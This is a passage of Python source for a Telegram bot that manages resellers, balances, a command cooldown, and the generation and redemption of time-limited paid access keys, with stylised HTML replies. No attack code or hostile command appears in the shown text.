            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/resellers", "", response)
        return

    reseller_list = []
    for rid, info in resellers.items():
        reseller_list.append(
            f"🆔 Reseller ID: {rid}\n"
            f"💰 Balance: {info['balance']}\n"
            f"🔑 Keys Generated: {len(info.get('keys', []))}\n"
            f"━━━━━━━━━━━━"
        )

    reseller_text = "\n".join(reseller_list) or "No resellers found."
    response = (
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b><i>👥 Resellers List</i></b>\n"
        f"<b><i>👤 Admin: @{username} (UserID: {user_id})</i></b>\n"
        f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
        f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{reseller_text}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
        f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/resellers", "", response)

@bot.message_handler(commands=['setcooldown'])
def set_cooldown_command(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["setcooldown"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    chat_type = 'group' if message.chat.type in ['group', 'supergroup'] else 'private'

    if not is_admin(user_id, username):
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>🚫 Access Denied: Admin only command!</i></b>\n"
            f"<b><i>Sirf admins cooldown set kar sakte hain!</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/setcooldown", f"Command: {command}", response)
        return

    command_parts = command.split(maxsplit=1)
    if len(command_parts) != 2 or not command_parts[1].isdigit():
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>📋 Set Cooldown Guide</i></b>\n"
            f"<b><i>Usage: /setcooldown <seconds></i></b>\n"
            f"<b><i>Example: /setcooldown 60</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/setcooldown", f"Command: {command}", response)
        return

    seconds = int(command_parts[1])
    set_cooldown(seconds)
    save_data()
    response = (
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b><i>⏳ Cooldown Set Successfully!</i></b>\n"
        f"<b><i>⏱️ New Cooldown: {seconds} seconds</i></b>\n"
        f"<b><i>👤 Admin: @{username} (UserID: {user_id})</i></b>\n"
        f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
        f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
        f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
        f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/setcooldown", f"Cooldown: {seconds}", response)

@bot.message_handler(commands=['checkcooldown'])
def check_cooldown_command(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["checkcooldown"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    chat_type = 'group' if message.chat.type in ['group', 'supergroup'] else 'private'

    response = (
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b><i>⏳ Current Cooldown</i></b>\n"
        f"<b><i>⏱️ Cooldown: {COOLDOWN_PERIOD} seconds</i></b>\n"
        f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
        f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
        f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
        f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
        f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/checkcooldown", "", response)

@bot.message_handler(commands=['addreseller'])
def add_reseller(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["addreseller"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    chat_type = 'group' if message.chat.type in ['group', 'supergroup'] else 'private'

    if not is_overlord(user_id, username):
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>🚫 Access Denied: Overlord only command!</i></b>\n"
            f"<b><i>Sirf Overlord resellers add kar sakte hain!</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addreseller", f"Command: {command}", response)
        return

    command_parts = command.split(maxsplit=1)
    if len(command_parts) != 2:
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>📋 Add Reseller Guide</i></b>\n"
            f"<b><i>Usage: /addreseller <user_id></i></b>\n"
            f"<b><i>Example: /addreseller 123456789</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addreseller", f"Command: {command}", response)
        return

    reseller_id = command_parts[1]
    if reseller_id in resellers:
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>❌ Reseller ID {reseller_id} already exists!</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addreseller", f"Reseller ID: {reseller_id}", response)
        return

    resellers[reseller_id] = {"balance": 0, "keys": []}
    save_data()
    response = (
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b><i>✅ Reseller Added Successfully!</i></b>\n"
        f"<b><i>🆔 Reseller ID: {reseller_id}</i></b>\n"
        f"<b><i>💰 Initial Balance: 0</i></b>\n"
        f"<b><i>👤 Added by: @{username} (UserID: {user_id})</i></b>\n"
        f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
        f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
        f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
        f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/addreseller", f"Reseller ID: {reseller_id}", response)

@bot.message_handler(commands=['addbalance'])
def add_balance(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["addbalance"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    chat_type = 'group' if message.chat.type in ['group', 'supergroup'] else 'private'

    if not is_overlord(user_id, username):
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>🚫 Access Denied: Overlord only command!</i></b>\n"
            f"<b><i>Sirf Overlord balance add kar sakte hain!</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addbalance", f"Command: {command}", response)
        return

    command_parts = command.split(maxsplit=2)
    if len(command_parts) != 3 or not command_parts[2].isdigit():
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>📋 Add Balance Guide</i></b>\n"
            f"<b><i>Usage: /addbalance <user_id> <amount></i></b>\n"
            f"<b><i>Example: /addbalance 123456789 100</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addbalance", f"Command: {command}", response)
        return

    reseller_id, amount = command_parts[1], int(command_parts[2])
    if reseller_id not in resellers:
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>❌ Reseller ID {reseller_id} not found!</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addbalance", f"Reseller ID: {reseller_id}, Amount: {amount}", response)
        return

    resellers[reseller_id]["balance"] += amount
    save_data()
    response = (
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b><i>💰 Balance Added Successfully!</i></b>\n"
        f"<b><i>🆔 Reseller ID: {reseller_id}</i></b>\n"
        f"<b><i>💵 Amount Added: {amount}</i></b>\n"
        f"<b><i>💰 New Balance: {resellers[reseller_id]['balance']}</i></b>\n"
        f"<b><i>👤 Added by: @{username} (UserID: {user_id})</i></b>\n"
        f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
        f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
        f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
        f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/addbalance", f"Reseller ID: {reseller_id}, Amount: {amount}", response)

@bot.message_handler(commands=['removereseller'])
def remove_reseller(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["removereseller"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    chat_type = 'group' if message.chat.type in ['group', 'supergroup'] else 'private'

    if not is_overlord(user_id, username):
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>🚫 Access Denied: Overlord only command!</i></b>\n"
            f"<b><i>Sirf Overlord resellers remove kar sakte hain!</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/removereseller", f"Command: {command}", response)
        return

    command_parts = command.split(maxsplit=1)
    if len(command_parts) != 2:
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>📋 Remove Reseller Guide</i></b>\n"
            f"<b><i>Usage: /removereseller <user_id></i></b>\n"
            f"<b><i>Example: /removereseller 123456789</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/removereseller", f"Command: {command}", response)
        return

    reseller_id = command_parts[1]
    if reseller_id in resellers:
        del resellers[reseller_id]
        save_data()
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>🗑️ Reseller Removed Successfully!</i></b>\n"
            f"<b><i>🆔 Reseller ID: {reseller_id}</i></b>\n"
            f"<b><i>👤 Removed by: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
    else:
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>❌ Reseller ID {reseller_id} not found!</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/removereseller", f"Reseller ID: {reseller_id}", response)

@bot.message_handler(commands=['genkey'])
def generate_key(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["genkey"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    chat_type = 'group' if message.chat.type in ['group', 'supergroup'] else 'private'

    if user_id not in resellers and not is_overlord(user_id, username):
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>🚫 Access Denied: Reseller or Overlord only!</i></b>\n"
            f"<b><i>Keys generate karne ke liye reseller bano ya Overlord se contact karo!</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/genkey", f"Command: {command}", response)
        return

    command_parts = command.split(maxsplit=2)
    if len(command_parts) < 2:
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>📋 Generate Key Guide</i></b>\n"
            f"<b><i>Usage: /genkey <duration> [context]</i></b>\n"
            f"<b><i>Durations: 1min, 1h, 1d, 7d, 1m</i></b>\n"
            f"<b><i>Context: group, private (default: group)</i></b>\n"
            f"<b><i>Example: /genkey 1d private</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/genkey", f"Command: {command}", response)
        return

    duration = command_parts[1]
    context = command_parts[2] if len(command_parts) == 3 else "group"
    if context not in ["group", "private"]:
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>❌ Invalid context! Use 'group' or 'private'.</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/genkey", f"Command: {command}", response)
        return

    minutes, hours, days, months = parse_duration(duration)
    if minutes is None:
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>❌ Invalid duration! Use: 1min, 1h, 1d, 7d, 1m</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/genkey", f"Command: {command}", response)
        return

    if user_id in resellers:
        cost = KEY_COST.get(duration, 0)
        if resellers[user_id]["balance"] < cost:
            response = (
                f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"<b><i>💸 Insufficient Balance!</i></b>\n"
                f"<b><i>Key Cost: {cost}</i></b>\n"
                f"<b><i>Current Balance: {resellers[user_id]['balance']}</i></b>\n"
                f"<b><i>Contact Overlord to add balance!</i></b>\n"
                f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
                f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
                f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
                f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
                f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━"
            )
            safe_reply(bot, message, response)
            log_action(user_id, username, "/genkey", f"Duration: {duration}, Context: {context}", response)
            return
        resellers[user_id]["balance"] -= cost

    key = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=8))
    generated_time = datetime.datetime.now(IST)
    expiration = add_time_to_current_date(months=months, days=days, hours=hours, minutes=minutes)
    keys[key] = {
        "duration": duration,
        "generated_time": generated_time.strftime('%Y-%m-%d %I:%M:%S %p'),
        "context": context,
        "generated_by": user_id,
        "blocked": False
    }
    if user_id in resellers:
        resellers[user_id].setdefault("keys", []).append(key)
    stats["total_keys"] += 1
    stats["key_gen_timestamps"].append(generated_time)
    save_data()

    response = (
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b><i>🔑 Key Generated Successfully!</i></b>\n"
        f"<b><i>🔑 Key: {key}</i></b>\n"
        f"<b><i>⏳ Duration: {duration}</i></b>\n"
        f"<b><i>📍 Context: {context.capitalize()}</i></b>\n"
        f"<b><i>⏰ Expires: {expiration.strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
        f"<b><i>👤 Generated by: @{username} (UserID: {user_id})</i></b>\n"
        f"<b><i>💰 Balance: {resellers[user_id]['balance'] if user_id in resellers else 'N/A'}</i></b>\n"
        f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
        f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
        f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
        f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/genkey", f"Key: {key}, Duration: {duration}, Context: {context}", response)

@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or f"UserID_{user_id}"
    stats["command_usage"]["redeem"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text
    chat_type = 'group' if message.chat.type in ['group', 'supergroup'] else 'private'

    command_parts = command.split(maxsplit=1)
    if len(command_parts) != 2:
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>📋 Redeem Key Guide</i></b>\n"
            f"<b><i>Usage: /redeem <key></i></b>\n"
            f"<b><i>Example: /redeem ABC12345</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/redeem", f"Command: {command}", response)
        return

    key = command_parts[1]
    if key not in keys:
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>❌ Invalid or Expired Key!</i></b>\n"
            f"<b><i>🔑 Key: {key}</i></b>\n"
            f"<b><i>Contact @Rahul_618 for a valid key.</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/redeem", f"Key: {key}", response)
        return

    key_info = keys[key]
    if key_info.get("blocked", False):
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>🔒 Key Blocked!</i></b>\n"
            f"<b><i>🔑 Key: {key}</i></b>\n"
            f"<b><i>Contact @Rahul_618 for assistance.</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/redeem", f"Key: {key}", response)
        return

    generated_time = datetime.datetime.strptime(key_info["generated_time"], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
    minutes, hours, days, months = parse_duration(key_info["duration"])
    expiration = generated_time + relativedelta(months=months, days=days, hours=hours, minutes=minutes)

    if datetime.datetime.now(IST) > expiration:
        response = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b><i>❌ Key Expired!</i></b>\n"
            f"<b><i>🔑 Key: {key}</i></b>\n"
            f"<b><i>Contact @Rahul_618 for a new key.</i></b>\n"
            f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
            f"<b><i>📍 Chat Type: {chat_type.capitalize()}</i></b>\n"
            f"<b><i>📅 Timestamp: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
            f"<b><i>⏱️ Bot Uptime: {calculate_uptime()}</i></b>\n"
            f"<b><i>{random.choice(CYBERPUNK_QUOTES)}</i></b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/redeem", f"Key: {key}", response)
        return

    users[user_id] = {
        "expiration": expiration.strftime('%Y-%m-%d %I:%M:%S %p'),
        "context": key_info["context"],
        "key": key
    }
    stats["redeemed_keys"] += 1
    save_data()

    response = (
        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b><i>🎉 Key Redeemed Successfully!</i></b>\n"
        f"<b><i>🔑 Key: {key}</i></b>\n"
        f"<b><i>⏳ Duration: {key_info['duration']}</i></b>\n"
        f"<b><i>📍 Context: {key_info['context'].capitalize()}</i></b>\n"
        f"<b><i>⏰ Expires: {expiration.strftime('%Y-%m-%d %I:%M:%S %p')}</i></b>\n"
        f"<b><i>👤 User: @{username} (UserID: {user_id})</i></b>\n"
